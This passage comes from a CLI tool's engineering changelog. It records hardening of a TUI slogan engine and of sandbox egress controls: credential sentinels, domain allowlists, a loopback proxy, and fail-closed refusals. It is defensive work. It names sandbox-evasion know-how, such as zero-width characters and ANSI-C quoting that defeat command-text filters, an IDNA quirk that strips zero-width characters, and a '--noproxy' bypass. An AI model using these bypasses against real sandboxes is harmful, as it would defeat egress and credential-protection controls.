gains a bounded constant Counter update; no benchmark was run).
Verification: 319 pytest cases + 97 pure-stdlib checks + 22/20 prior
checks, all green.


---

## 21. Public Argument Type Surface: Event Guard and Dirty-Owner Isolation

This round changes no verdict and NOT ONE LINE of the cleaning layer.
It closes the last two unguarded public-argument paths left by eight
prior rounds.

- **N1: no type guard before table lookup.** Measured
  `pick_for_event(['a'])` raised the LEAKED low-level
  `TypeError: unhashable type: 'list'` (same for a dict), inconsistent
  with `record_error` which sanitizes first and rejects structurally.
  TUI `_slogan_dispatch`'s `except UnboundSloganEvent` could not catch
  it, so it fell through to `except Exception` and only recorded
  `error:TypeError` -- bypassing the strict contract expected by
  `strict=True` dev mode. `pick_for_event` now guards with
  `isinstance` at the very top; every non-str value raises the SAME
  `UnboundSloganEvent` with a FIXED `<invalid-event>` placeholder.
  Deliberately NOT calling `str(raw)`, otherwise oversized or
  control-character-laden external strings enter tracebacks. Nine
  non-string inputs (including unhashable list / dict / tuple /
  frozenset) are handled uniformly; all 18 legal events unchanged.
- **N2: non-string `owner` silently folded into the empty key.** The
  old `norm_owner` collapsed `None / 123 / True / bytes / list / dict
  / float` all into `''`. Measured: seven distinct dirty owners shared
  ONE bucket and polluted the default bucket used by callers that
  omit `owner`; worse, `dispatch_log(None)` means "full snapshot"
  while `dispatch_log(123)` queried the empty bucket -- the SAME run
  returned 9 and 8 rows respectively. One typo yields a completely
  wrong log set with no error and no trace. `None` still means "no
  owner"; every other non-string now maps to the fixed isolation
  bucket `owner:invalid` (clean, 13 codepoints, strictly idempotent,
  write/query sides align automatically -- `dispatch_log(d.owner)`
  now finds the dirty entries). The entry-point `_coerce_owner()`
  calls `_note_invalid_owner()`; type names come from the publicly
  controllable `type(raw).__name__`, so they pass through the SAME
  cleaning core, are length-capped at 32, and the kind set is capped
  at 32 with overflow folded into `<other>`. Measured: a custom class
  name containing OSC8 + RLO + 500 A's becomes 33 clean codepoints.
  `dispatch_log_stats()` gains `invalid_owner_calls` /
  `invalid_owner_types`; `audit().as_dict()` carries them
  automatically. Counting happens ONLY at the two entry points --
  after 20 rounds of queries the counter is still 1. All are
  information items and do NOT affect `audit().ok`.

FOUR CANDIDATES JUDGED "DO NOT FIX": non-string `lang` silently falls
back to the default locale (affects only wording, not bucketing or
verdicts); `record_error`'s event/kind were already sanitized by D4;
`sanitize_log_field` / `sanitize_verb` return empty for non-strings
(existing fail-closed contract); `owner=None` sharing the default
bucket with `''` and `dispatch_log(None)` being a full snapshot are
explicit documented compatibility contracts. This round ONLY
separates "non-string dirty value" from "no owner".

ONE pre-existing SOURCE-LEVEL assertion was SYNCHRONIZED to the new
contract, NOT relaxed: `t_d5_owner_normalization` asserted
`owner = norm_owner(owner)` in source; after the entry point moved to
`_coerce_owner`, it now checks `def norm_owner`, `def _coerce_owner`,
`owner = _coerce_owner(owner)` and both call sites, while keeping ALL
runtime assertions. No other pre-existing assertion was touched.

**Honest limits**: the behavior change affects ONLY erroneous usage --
non-string owners move from the default bucket to the isolation
bucket; normal strings / `None` / `''` are unchanged. Callers relying
on "passing a number still lands in the default bucket" must pass a
string. A caller genuinely using the STRING `"owner:invalid"` as an
owner collides with the dirty bucket (inherent collision surface of a
fixed key; locked by a regression, zero collisions NOT claimed). Type
distribution is at most 32 concrete kinds + 1 `<other>`; oversized
class names keep only the first 32 codepoints plus an ellipsis.
`_clean.py`, `tui.py`, `runtime_slogans.py` and
`test_runtime_slogans.py` are byte-identical and NOT in this push.
No list corruption reproduced under concurrency; no real-device soak
test; fork changes still unmerged; no external adaptive red team. NO
performance improvement is claimed (one extra isinstance plus a
bounded Counter update per entry; no benchmark was run). No
self-introduced defect requiring a revert was MEASURED this round,
but five boundary cases (A'-E') were each exercised.
Verification: 343 pytest cases + 105 pure-stdlib checks + 22/20 prior
checks, all green.


---

## 22. Engine Public-Argument Surface: Half-Updated State and Unsanitized Diagnostics

This round changes no verdict and NOT ONE LINE of the cleaning layer
(`_clean.py` byte-identical). Nine prior rounds almost exclusively
edited `ui/slogans/mapping.py`; this round moves the "measure first,
then fix" method to the **runtime slogan engine itself**
`tui/runtime_slogans.py`.

**The worst finding is a HALF-UPDATED STATE ON THE EXCEPTION PATH
(P1).** D1's `RLock` solved CONCURRENT tearing but cannot stop an
exception: `note_activity` writes state FIRST and only THEN calls
`int(at*1000)` inside `_record_locked`. Measured: `now=math.nan`
raises ValueError AFTER `_last_event_at=nan`, `_seq`, `_phase` and
`_current` have ALL been written; subsequently `liveness()` and
`snapshot()` raise ValueError forever -- ONE dirty public clock
argument stalls the entire TUI render loop. On the same path:
`now='1000'` leaked a low-level TypeError, `inf` raised
OverflowError, `True` was silently treated as 1 second, `1e308` is a
LEGAL finite value yet overflows to inf at `int(at*1000)`, and an
injected `clock` returning a dirty value or raising also killed the
caller. The engine never received the strict validation that round 7
gave to `mapping`.

Fix: a single clock entry `_now(value)`. `_coerce_now_value` accepts
only finite real seconds, rejecting bool / non-number / non-finite /
negative / above `_MAX_NOW_SECONDS=1e9` (the clamp exists so
`int(at*1000)` cannot overflow, NOT as a business time limit).
Priority: legal `now` > legal injected `clock` > `time.monotonic()`;
a raising injected clock is also caught. Validation completes BEFORE
ANY FIELD WRITE -- that is the key to eliminating the exception-path
half-update. `0` is a legal zero, checked explicitly with `is None`
(round 7 was bitten by `or fallback()` swallowing zero). All five
public exits (`note_activity`, `note_progress`, `liveness`, `render`,
`snapshot`) route through it.

FIVE MORE REAL DEFECTS:

- **P2**: `note_progress(kind=evil)` kept 530 codepoints containing
  OSC 8 + U+202E RLO verbatim in `EventRecord.kind`, which reaches
  diagnostic output via `Liveness.evidence`. Now passes through
  `sanitize_log_field(kind, 40)` with a `"progress"` fallback -- the
  SAME cleaning truth that `mapping.record_error` already used.
- **P3**: `str(raw_mode)` spliced a 5000-codepoint ESC/RLO string from
  settings.json straight into `source`, reaching `Liveness.source`,
  `snapshot()` and `render`. Added `_safe_source()` (unified cleaning,
  120-codepoint cap); non-string `mode` is rejected outright, string
  `mode` cleaned and capped at 40; budget keys and `str(p)` likewise
  cleaned. Valid configs keep `source == str(p)` unchanged.
- **P4**: `reset()` used the real clock while
  `note_activity(now=...)` used the injected one: evidence chain
  `[1000000, 1001000, 1000000]` went BACKWARDS, and under real
  monotonic two time sources were mixed. `reset()` now reuses
  `_last_event_at` (with a nan/inf guard) and does NOT change its
  signature; the chain is monotonic and homogeneous, and the boundary
  is marked by `kind="reset"`.
- **P7**: `detail=None/123` made `len(detail)` raise TypeError;
  `detail=['a']` was iterated as a string by `_detail_class`,
  yielding a misleading `class='ascii'`. Non-strings collapse to `""`,
  consistent with D3's "never record the detail text".
- **P8**: `load_config(123)` leaked a low-level TypeError because
  `p = _settings_path(path)` sat OUTSIDE the `try`, contradicting the
  docstring's "a bad config must never crash the TUI". Moved inside;
  dirty paths now fall back to `builtin`.

FOUR CANDIDATES JUDGED "DO NOT FIX": `phase` falling back to
`waiting_model` for any non-str / unknown / unhashable value without
raising (existing fail-safe; phase never enters logs verbatim);
string `detail` recording only length + character class, never the
text (D3's desensitization contract -- 200k codepoints still leave
one integer); unknown phase keys returning the fixed
`invalid:budget-phase` (the check precedes `__post_init__`, so the
raw key never reaches `source`); `sanitize_verb(123)==''` (existing
fail-closed). Also locked "`liveness`/`render`/`snapshot` remain pure
reads" by regression, so nobody reintroduces liveness bookkeeping
from the render loop -- the "timed idling that pretends to be busy"
D4 repeatedly rejected.

**Honest limits**: the behavior change affects ONLY erroneous usage --
dirty `now`/`clock`, non-string `detail`/`kind`, dirty `path` go from
"raise or carry raw text" to "clean / fall back / reject"; legal
`now`, valid configs, legal `kind`, string `detail` and the
`reset()` signature are unchanged. `now` is clamped to `[0, 1e9]`
seconds; larger values (including legal but enormous finite ones)
fall back to the real clock -- arbitrary-magnitude monotonic clocks
are NOT claimed to be supported. `reset()` may share `at_ms` with the
last evidence row; when a caller omits `now` while other calls inject
it, this round guarantees NO backwards step and NO mixed-source write
inside one chain, but the root cause of two clocks still relies on
caller discipline. **The ONLY runtime code file changed this round is
`runtime_slogans.py`**; `mapping.py`, `_clean.py`, `tui.py`,
`ui/slogans/__init__.py`, `test_slogan_mapping.py` are byte-identical
and NOT in this push. No pre-existing assertion was touched or
relaxed. NO self-introduced defect requiring a revert was MEASURED
this round (second time in a row), but six boundaries were exercised:
legal zero, huge finite value, raising clock, non-str kind, legacy
nan in reset, and `Decimal`. We do NOT claim "zero defects", only
"none measured". No list corruption reproduced under concurrency; no
real-device soak test; fork changes still unmerged; no external
adaptive red team. NO performance improvement is claimed (one extra
numeric validation and cleaning call per entry; no benchmark run).
Verification: 376 pytest cases + 117 pure-stdlib checks + 22/20 prior
checks, all green. The stdlib verifier's new engine checks were
measured to import successfully with `pytest / rich /
prompt_toolkit / wcwidth` blocked (`tuan_cli.tui` uses PEP 562 lazy
exports), so the pure-stdlib constraint is preserved.


---

## 23. Injection Contracts and the Config-Switch Anchor: One Seq Cannot Map to Two Verbs

This round changes no verdict and NOT ONE LINE of the cleaning layer
(`_clean.py` byte-identical). The ONLY runtime code file changed is
again `tui/runtime_slogans.py`.

**D (most valuable): `reload()` broke D1's `(seq, verb)` tearing
anchor.** D1 uses the `(seq, verb)` pair in `EventRecord` as the
concurrent-tearing detection anchor: one seq maps to exactly one
verb. The old `reload()` set `_current = ""` but did NOT advance seq
and did NOT record evidence, while `render()` shows the first entry
of the new pool when `_current` is empty. Measured:

```
after event    seq=1  current='正在刷屏'   evidence.verb='正在刷屏'
after reload   seq=1  current=''          evidence.verb='正在刷屏'
render.text='重装后的词'   view.seq=1
>>> ONE seq maps to TWO verbs
```

Worse, a second `reload()` returned `(False, "unchanged")` yet
STILL cleared `_current`, causing a silent verb change. A config
switch is now treated as an AUDITABLE STATE TRANSITION:
`unchanged` is a TRUE no-op (no current clear, no seq change, no
evidence, no cache touch); `changed` takes the new verb from the
first entry of the new pool (deterministic, **rng NOT called**, so a
config reload is not disguised as a random spinner event), advances
`seq`, and records `kind="reload"` evidence whose `verb` equals the
screen text EXACTLY. The evidence timestamp reuses
`_last_event_at` (homogeneous with round 10 P4's `reset()`), so the
real monotonic clock and an injected clock are never mixed in one
chain. Measured: `seq 1->2`,
`current = evidence.verb = render.text = '重装后的词'`, five
consecutive reloads always yield the first pool entry `A`, and
under a real clock `[1000000, 1000000]` instead of two time
sources. This is NOT D4's forbidden "bookkeeping liveness from the
render loop" -- reload is an explicit config event; D4 objects to
timed idling that pretends to be busy.

**A: `__init__`'s `or` swallowed falsy but perfectly legal injected
objects.** Old `config or load_config()` / `rng or random.Random()`.
Measured with a `__bool__=False` config subclass and a `__len__=0`
custom rng: `config.source` went from `INJECTED` to `builtin`, the
injected `rng.choice` was called 0 times, and two identically built
engines produced different verbs -- the deterministic-replay
contract built in round 4 was eaten by one `or`. This is the THIRD
occurrence of round 7's A' (`or fallback()` swallowing legal `0`).
Both now use explicit `is None`; injected objects survive,
`rng.choice` is called once, two engines agree, and `None` still
uses factory defaults. **`lang` is deliberately NOT changed**:
measured `slogan_bank("")` falls back to the ENGLISH bank, so
switching to `is None` would turn `lang=''` from local zh-CN into
English -- a behavioral regression. Judged "DO NOT FIX".

**B: `load_config` silently truncated 205 -> 200 custom verbs.** Old
`raw_verbs[:200]` made the 205th entry vanish while `source` stayed
on the NORMAL path with no hint -- the same "silent ignoring is a
dangerous false sense of safety" as round 10 P8. 200 is a DoS
guard, but it must not take effect quietly: over-limit configs are
now REJECTED ENTIRELY with `invalid:too-many-verbs`. <=200 is
unchanged (`source == str(p)`, `V199` still present).

**C: `mode=default` silently ignored custom verbs when none were
renderable.** Measured
`{"mode":"default","verbs":[123,None,['a'],{},True]}`: after
cleaning nothing remains, yet `source` is the NORMAL path -- the
user believes they customized slogans while the built-in bank is
actually used. Now "custom verbs present but none renderable" is
rejected for ALL modes with the EXISTING `invalid:empty-verbs`
source (reused, so no pre-existing assertion semantics change); mixed
input still keeps the renderable entries.

FOUR CANDIDATES JUDGED "DO NOT FIX" (each locked by a regression):
`lang`'s `or` (changing it is a regression),
`phase_budgets_ms`'s `[:10]` (legal phase keys cap at 5 < 10 --
UNREACHABLE code), `snapshot()` writing `_pools` (deterministic,
idempotent, pure-memory harmless cache), and `evidence_seq`
saturation (deque maxlen=16; the name suggests a global counter but
it is the window size). **Last round's regression
`test_liveness_is_still_pure_read` MISSED `_pools`**, so the claim
of "fully pure read" was imprecise; this round adds
`test_snapshot_populates_pools_deterministically` to lock the fact
as an executable assertion (5 pools, two snapshots identical,
`_pool()` hits agree). That is paying back last round's imprecise wording, not
fixing a bug.

ONE pre-existing runtime assertion PLUS one prior standalone-script
assertion were SYNCHRONIZED to the new contract, NOT relaxed: the
old `snapshot()["current"] == ""` now additionally requires the new
verb, `kind="reload"`, and `verb`/`seq`/`render.text` alignment --
STRICTER. All other pre-existing assertions untouched.

**Honest limits**: two behavior changes are called out -- (a) >200
`verbs` goes from silent truncation to full rejection with
`invalid:too-many-verbs` (deployments relying on 201+ entries must
split or trim); (b) after a successful `reload()`, `current` goes
from `""` to the new pool's first entry, `seq` +1, plus one
`kind="reload"` evidence row; failure / unchanged / legal `now` /
normal spinner event paths are unchanged. `mapping.py`, `_clean.py`,
`tui.py`, `ui/slogans/__init__.py`, `test_slogan_mapping.py` are
byte-identical and NOT in this push; the cleaning layer is
byte-identical for two rounds running. NO self-introduced defect
requiring a revert was MEASURED (third time in a row), but seven
boundaries were exercised: `lang=""`, the 200/201 edge, five legal
budget keys, unchanged no-op, real vs injected clock, reload on a
fresh engine, and deterministic first entry. We do NOT claim "zero
defects", only "none measured". No list corruption reproduced under
concurrency; no real-device soak test; TUI still replaces no
existing i18n copy; local-fork changes still unmerged; no external
adaptive red team. NO performance improvement is claimed (one extra
`is None` and length check per entry, one extra pool computation per
reload; no benchmark run). Verification: 404 pytest cases + 126
pure-stdlib checks + 22/20 prior checks, all green. The stdlib
verifier's 9 new engine checks still import with
`pytest / rich / prompt_toolkit / wcwidth` blocked (PEP 562 lazy
exports), preserving its pure-stdlib constraint.


---

## 24. B2: Child-Process Egress Boundary and Credential Sentinels

Full reproduction in `CLAUDE_PARITY.md` section 12.

**MEASURED defect**: `SandboxManager._execute_backend` computed
`block_net = not verdict.network`, but the `local` branch passed NEITHER
`block_net` NOR `env` to `run_with_tree_kill`. Two consequences:

1. With `verdict.network=False` on the `local` backend, the command still
   ran with the parent process's FULL `os.environ` -- a network-deny verdict
   silently failed on the ONE backend that has no OS-level egress isolation.
   L2's command-text detection is bypassable by zero-width characters,
   ANSI-C quoting and comment newlines (measured in earlier fuzz rounds).
2. Real credentials such as `GITHUB_TOKEN` / `AWS_SECRET_ACCESS_KEY`
   entered the child process verbatim, contradicting the catalog's claim
   that "the child holds no secrets".

**Fix**: new `tuan_cli/sandbox/egress.py` puts the boundary BEFORE execution:

| Component | Role |
|---|---|
| `CredentialBroker` | Real values live only in current-process memory; the child gets `tuan-egress-sentinel-v1:<fp>`; repr / audit / exceptions / `to_audit_dict()` never leak |
| `build_child_env` | Keeps non-sensitive vars (PATH/HOME/LANG); replaces sensitive keys with sentinels; dirty input (non-Mapping / non-str key or value) yields an EMPTY env, never silently falls back to inheriting `os.environ` |
| `enforce_local_egress` | local + deny -> **fail-closed REJECTION**, never pretends the deny succeeded; strong backends keep their own boundary |
| `EgressGuard` | Composes all three; the manager's local branch really calls it and passes `env=` |

Two more capabilities shipped in the same round: `unattended.py` implements
`permissions.denyInsteadOfPrompting` (default OFF; `denied=True` remains a
hard fact, while `continue_turn` / `suppressed_prompt` are structured into
`verdict.extra` and queryable audit; REALLY wired into `assess_tool`);
`worktree_boundary.py` is REALLY wired into `worktree_layer.py`'s
`create` / `create_agent_worktree` / `_git`, asserting the resolved target
stays inside the workspace (including symlink ancestors), stripping
`GIT_DIR` / `GIT_WORK_TREE` / `GIT_INDEX_FILE` redirect variables, and
rejecting out-of-bound `git -C` / `--git-dir` argv.

**Configuration and behavior changes (stated honestly)**:
`sandbox.resource.egress_credential_masking=true` and
`egress_block_local_when_denied=true` (defaulting ON fixes a measured
fail-open; explicitly turning either off is reported as a security
downgrade by `config validate`); `permissions.denyInsteadOfPrompting`
defaults to false and enabling it emits a behavior-change warning.
`deny_network_by_default` REMAINS false -- honoring the prior 13 rounds'
commitment not to flip a destructive default without a migration switch.

**Honest limits**: `inject_headers()` is OFF by default and there is NO
egress proxy forwarding process, so `credential_masking` moves from gap to
**partial** only, NOT aligned; we do not claim full parity with CC's
"sentinel + proxy injection". `os_sandbox` REMAINS a **gap** (OS-level
isolation still is not the default execution boundary) and
`network_default_deny` is partial (factory default not flipped, per-command
`allowed_domains` strong binding still missing). `fully_superior` is still
false (26 gaps, B2 not fully complete, no external adaptive red team).
No real-device multi-platform verification: Windows Job Object / macOS
Seatbelt were not exercised on real machines.

Verification: 34 new regression cases + 108 parity/CLI/headless cases +
353 related sandbox/worktree/hooks/config/hardening cases, all green;
`matrix.validate() == []`, `security_wiring_intact=true`. Two pre-existing
count assertions were SYNCHRONIZED to the new baseline, NOT relaxed.


---

## 25. B2 Wrap-up: Per-Command Domain Binding and a Real Local Egress Proxy

Full reproduction in `CLAUDE_PARITY.md` section 13.

**MEASURED gap**: `SandboxProfile` had only `network: bool`;
`_run_provider` built `SandboxProfile(network=verdict.network, ...)`;
`assess_command(...)` produced `verdict.extra = {}` -- the execution layer
and the egress path had NO notion of domains at all. `TrustFilter`'s global
allowlist works only at the command-TEXT layer (a follow-up measurement
confirmed it does return DENY, correcting section 12's reproduction which
mistook `network`/`isolate` fields for the `action`), and text detection is
bypassable by zero-width characters, ANSI-C quoting, comment newlines and
indirect variable references.

**Fix -- move the enforcement point from text to the egress path**:

| Component | Role |
|---|---|
| `sandbox/egress_allowlist.py` | Strict `normalize_domain`; `NetworkClaim` PER-COMMAND declaration (tool-arg `allowed_domains` wins, global fallback is honestly labelled via `source`); `evaluate_claim` rejects out-of-claim hosts, rejects everything when strict with no declared host, and MARKS `undetectable` instead of silently treating "no domain detected" as proven compliance |
| `sandbox/egress_proxy.py` | A REAL, runnable stdlib loopback proxy: `CONNECT` validates the host against the claim (403 outside claim, tunnel otherwise); plain-HTTP absolute URIs are validated too and `CredentialBroker.inject_headers()` restores sentinels to real values while forwarding; `env_overrides` sets `HTTP_PROXY`/`HTTPS_PROXY`/`ALL_PROXY` and CLEARS `NO_PROXY` |
| `core/sandbox_provider.py` | `SandboxProfile` gains `allowed_domains`. HONESTLY: bwrap/seatbelt only have network-namespace / IP-level rules, no domain-level filtering, so this field is metadata |
| `sandbox/manager.py` | Claim flows into `verdict.extra` -> `SandboxProfile.allowed_domains`; the local branch manages proxy lifetime with `try/finally` (timeout/exception ALWAYS stop()) |
| `config/security_schema.py` | `sandbox.resource.egress_proxy_enabled` validation; enabling emits a BEHAVIOR-CHANGE warning |

**A-prime (self-introduced, self-caught)**: the first `normalize_domain`
used `str.encode("idna")`, which silently DROPS U+200B ZWSP:
`evil\u200b.example -> evil.example`. A different host with an inserted
zero-width character could therefore match an allowlist declaration. Fixed
with an ASCII constraint + per-character whitelist (non-ASCII -> `None`);
dirty declarations are recorded as `invalid_values` and fail closed. Cost:
internationalized domain names are not supported.

**Configuration**: `sandbox.resource.egress_proxy_enabled` defaults to
**false** (enabling rewrites every child process's proxy environment, a
behavior change); a proxy is constructed only when explicitly enabled AND a
`strict` per-command claim exists. The claim's policy-layer binding is
always active, so "off" is NOT counted as a security downgrade.
`deny_network_by_default` REMAINS false -- not flipped.

**Matrix -- no padding by editing definitions**: `aligned 45 -> 46`,
`partial 10 -> 9`, **gaps STILL 26** (`network_strict_allowlist` was a
`partial`, not a `gap`; advancing it does not reduce the gap count).
`fully_superior` still false, `b_waves_done` still `["B1"]`.

**Honest limits**:
1. `credential_masking` REMAINS `partial`: plain-HTTP sentinel injection is
   REALLY wired (real-socket end-to-end test, upstream receives the real
   credential), but after an HTTPS CONNECT tunnel the proxy only forwards
   encrypted bytes and CANNOT see headers. Covering HTTPS needs TLS MITM +
   a local CA, which significantly enlarges the attack surface; not done
   here and NOT claimed as full parity with CC's proxy injection.
2. bwrap/seatbelt have no domain-level filtering; `allowed_domains` is
   metadata only.
3. `undetectable` is a MARKER, not proof: if a command explicitly passes
   `--noproxy` and bypasses `env_overrides`, the strong binding is lost.
   This is an inherent limitation of a local CLI, not a disguised hole.
4. `os_sandbox` remains a gap; `block_writes_outside_wd` remains partial.
5. No real-device multi-platform verification; A-line still has 10
   pending modules, the local fork remains unmerged, and no third-party
   adaptive red team has been run. The slogan engine / cleaning layer /
   `mapping.py` / `tui.py` are byte-identical to parent.

Verification: 43 new regression cases (including real-socket proxy
end-to-end: allowed host 200 + upstream gets the real credential,
out-of-claim 403, CONNECT 403, audit leaks nothing, finally always stops)
plus combined batches all green; `matrix.validate() == []`,
`evidence.verify_evidence() == []`, `verify_doc_numbers.py problems == []`.
Two pre-existing count assertions were SYNCHRONIZED to the new derived
baseline, NOT relaxed.


---

## 26. Depth Round: One Egress/Credential Exit for Every Execution Branch

Full reproduction in `CLAUDE_PARITY.md` section 14. **Calibration of
section 13**: marking `network_strict_allowlist` as `aligned` was too
generous -- the binding was wired ONLY into the `local` branch of
`_execute_backend`.

### MEASURED gap

| Branch | EgressGuard | claim check | proxy env | `last_egress` |
|---|---|---|---|---|
| `local` | yes | yes | yes | yes |
| `landlock`/`docker`/`seatbelt`/`bwrap` | **no** | metadata only | **no** | **no** |
| `jobobject` (`_run_syscall`) | **no** | **no** | **no** | **no** |

- `SandboxProfile.allowed_domains` appears **exactly once** in the whole
  `sandbox_provider.py` (the dataclass field); **no backend consumes it**,
  so a strict claim is entirely ineffective on strong backends.
- `_run_provider` never passes `env`, so it uses `sanitize_env` (blanking)
  instead of the EgressGuard sentinel + `CredentialBroker` chain.
- **WORST**: `run_syscall_sandboxed` had **no `env` parameter at all**.
  Every `Popen` / `run_with_tree_kill` / `os.execvp` inherited the parent's
  full environment -- on Job Object / seccomp / fallback paths the REAL
  secrets entered the child process, not even blanked. **The highest-
  assurance paths had zero credential protection.**

### Fix

| Module | Role |
|---|---|
| `sandbox/egress_plan.py` (new) | `plan_egress()` decides ONCE before branching; `plan_is_consistent_with_verdict()` prevents audit/execution divergence |
| `sandbox/manager.py` | All four branches take `plan.env` and write `last_egress`; `_run_provider`/`_run_syscall` gain `env`; `_make_egress_proxy(plan)` only reads `plan.wants_proxy` |
| `arch/platform.py` | All three entry points gain `env`, threaded to Job Object `Popen`, `os.execvpe`, `unshare -n`, Linux fallback `Popen` and other-platform fallback. `env=None` preserves inheritance for existing callers |
| config (3 files) | New key `sandbox.resource.strict_claim_strong_backend` (`deny` default / `metadata_only` downgrade): schema enum rejection + downgrade warning + `harden status` item |

**Contracts**: every backend receives EgressGuard-sanitized env; a TRUE
per-command declaration (`source=tool_args`) on a strong backend is
**refused fail-closed by default** because no domain-level filtering exists
and the loopback proxy is unreachable under netns/seatbelt isolation.
`source` -- deliberately recorded but unused in section 13 -- now actually
determines behavior for the first time: global-allowlist fallback
(`global_policy`) keeps the existing text-layer semantics so **existing
deployments are not broken**.

### A-prime (self-introduced, self-caught)
1. The unified `to_audit_dict()` dropped `allowed` (a B2-first-round
   observability contract); `test_b2_boundaries` raised `KeyError` --
   the gate was locked but monitoring could not see `allowed=false`.
   Caught by batch A, restored with a locking comment.
2. After changing `_run_provider`'s signature, **3 pre-existing assertions
   were SYNCHRONIZED AND MADE STRICTER** (they now require a real sanitized
   env), NOT relaxed.

### Matrix: NOT A SINGLE STATUS CHANGED
`aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
`b_waves_done=["B1"]`. Two catalog notes gained calibration text but
`status`/`evidence` structure is unchanged; `matrix.validate()` and
`evidence.verify_evidence()` both return empty. A new regression pins every
count so **no padding by editing definitions**.

### Honest limits
HTTPS CONNECT tunnel header injection remains unavailable (needs TLS MITM
+ local CA; `credential_masking` stays `partial`); bwrap/seatbelt/seccomp
have no domain-level filtering and `allowed_domains` is still metadata
(the stance is "refuse when unprovable", not "we did it"); `metadata_only`
is a REAL downgrade, explicitly surfaced by schema warning + harden status;
`undetectable` is a marker not proof; `os_sandbox` remains a gap,
`deny_network_by_default` remains false, `block_writes_outside_wd` remains
partial; no real-device multi-platform verification; the long
`test_platform_portability.py` batch hit repeated 502/timeouts in this
sandbox and reached only ~51% with zero failures -- **reported as
incomplete, not as a pass**; the 1 `test_arch_security.py` failure was
proven pre-existing by a parent-blob BASELINE CONTROL in the previous
round and the policy was NOT relaxed to make it green. A-line still has
10 pending modules, the local fork remains unmerged, no third-party
adaptive red team. The slogan engine / cleaning layer / `mapping.py` /
`tui.py` are byte-identical to parent.

### Verification
`test_b2s_egress_uniform.py` + `test_b2_egress_strict.py` **80 passed**;
combined batch A **341 passed**; per-file arch_platform 10 /
arch_security_fixes 6 / proc 5 / risk_sandbox 14 passed;
`matrix.validate() == []`, `evidence.verify_evidence() == []`,
`verify_doc_numbers.py problems == []`.


---

## 27. Depth Round: Terminal Refusals Never Fall Back, Inner Layer No Longer Eats Placeholders

Full reproduction in `CLAUDE_PARITY.md` section 15. **Calibration of
sections 13/14**: the binding was wired layer by layer, but the REFUSAL
result itself was never wired correctly, and an inner layer ate the
placeholder again. NOT A SINGLE MATRIX STATUS CHANGED.

### Four MEASURED disconnects

| ID | Measured result |
|---|---|
| **R1** | `tools/shell.py::_route_sandbox_isolation` uses only `verdict.enforced / backend_available` to decide whether to accept the isolation result. A `plan_egress` REFUSAL is naturally `enforced=False` (nothing executed). With `enforce_required=false` and no strong backend the route returns `None`, so `run_shell` runs the JUST-REFUSED command **bare in the real workspace** via `subprocess.Popen`. Confirmed by measuring three verdict configurations. |
| **R2** | `copy_diff_apply` still ran `build_diff_preview -> make_confirm_callable -> confirm_apply` after a pre-execution refusal. The copy is EMPTY (nothing ran): `error` became "denied + preview" disguising a compliance refusal as a user decline, `verdict.enforced=True` unconditionally claimed "isolated execution", and a confirmation card asked the user to approve writing back a change that never happened. |
| **R3** | `SandboxProvider._sanitize_env` blanks `OPENAI_API_KEY` by KEY NAME, which also wiped the `tuan-egress-sentinel-v1:<fp>` placeholder injected by `plan_egress` into `''`. Section 14 had verified the **env argument passed to `provider.run`**, NOT the value the child actually received. Strong-backend children got no recoverable marker and the `inject_headers()` chain silently broke. |
| **R4** | `SECRET_HINTS` contains `"TUAN_"`, so `TUAN_WORKSPACE` was blanked; only `LocalSandbox` restored it, the other three strong backends did not. |

**R3 stated honestly**: under current defaults a strong backend with a true
per-command declaration is refused by section 14 and no proxy is started, so
this break has NO observed real-world impact yet. The fix restores wiring
consistency so a future relaxation (e.g. `metadata_only` + host-network
proxy) cannot fail silently. Not overstated.

### Fix

| Location | Change |
|---|---|
| `sandbox/manager.py` | `SandboxExecResult` gains `terminal_refusal: bool = False`, DECOUPLING "terminal security refusal" from "isolation actually took effect"; `_execute_backend` sets it on `not plan.allowed`; `_execute_copy_diff_apply` returns immediately on it (no diff, no confirmation, no `verdict.enforced=True`) |
| `tools/shell.py` | The route checks `res.terminal_refusal` FIRST and unconditionally returns `[error] <reason>` -- NEVER falls back. Normal-execution routing is unchanged. |
| `core/security_utils.py` | New `MASKED_PLACEHOLDER_PREFIX` / `is_masked_placeholder()` in the shared-primitives layer (avoids a `core -> sandbox` reverse import cycle); global `sanitize_env` semantics UNCHANGED |
| `core/sandbox_provider.py` | `_sanitize_env` preserves placeholders BY VALUE (real values still blanked by key name); all four backends restore `TUAN_WORKSPACE` from the `workspace` parameter, not from untrusted env |

**Critical**: the two changes must land together -- the fallback must be
blocked BEFORE removing `verdict.enforced=True`, otherwise "fixing a
semantic lie" directly becomes "allowing bare execution".
`terminal_refusal` is the single shared contract.

### A-prime (self-introduced, self-caught)
A comment used an error-text example containing `\n`; Python's triple-quoted
string turned it into a REAL newline, producing a standalone `preview"),`
line in source and a `py_compile` `SyntaxError` (manager.py:496). Reworded
without the backslash. A comment broke compilability, not a runtime defect,
but recorded honestly.

### Four "not changed on purpose" (each with an executable regression)
`last_egress` concurrent tearing NOT reproduced (2 threads x 200 writes, 0
tears, GIL happens to cover it) -- NO lock added, no thread-safety claim;
`cmd_safe.py` only probes `is_available()/.name`; `orchestration.py` only
attaches the instance to `agent.ctx.sandbox_provider` with no `.run()` call
anywhere (new source-scan regression, plus an honest note that a future
downstream `ctx.sandbox_provider.run()` would bypass the whole
`plan_egress`); global `sanitize_env` behavior unchanged.

### Matrix: NOT A SINGLE STATUS CHANGED
`aligned 46 / partial 9 / gap 26`, `fully_superior=false`,
`b_waves_done=["B1"]`. Two catalog notes gained a THIRD calibration
(section 13 overstated -> 14 -> 15) but `status`/`evidence` structure is
unchanged; `matrix.validate()` and `evidence.verify_evidence()` both empty.
A new regression pins every count so no padding by editing definitions.

### Honest limits
HTTPS CONNECT tunnel header injection still unavailable
(`credential_masking` stays `partial`); bwrap/seatbelt/seccomp have no
domain-level filtering and `allowed_domains` is still metadata;
`last_egress` is still not thread-safe; `undetectable` is a marker not proof;
`os_sandbox` remains a gap, `deny_network_by_default` remains false,
`block_writes_outside_wd` remains partial; no real-device multi-platform
verification -- the long `test_platform_portability.py` batch reached only
~51% with zero failures in the previous round and was NOT rerun here, so
"incomplete" is carried forward honestly; the 1 `test_arch_security.py`
failure was proven pre-existing by a parent-blob BASELINE CONTROL and still
reports 1 failed / 6 passed, with NO policy relaxation to make it green.
A-line still has 10 pending modules, the local fork remains unmerged, no
third-party adaptive red team. The slogan engine / cleaning layer /
`mapping.py` / `tui.py` are byte-identical to parent.

### Verification (split batches, NOT claimed as one full-suite run)
This round + previous two **106 passed**; shell-routing impact **99 passed**;
parity + config + security regression **170 passed**; sandbox/platform/proc
per-file **91 passed total** (batches overlap, NOT summed);
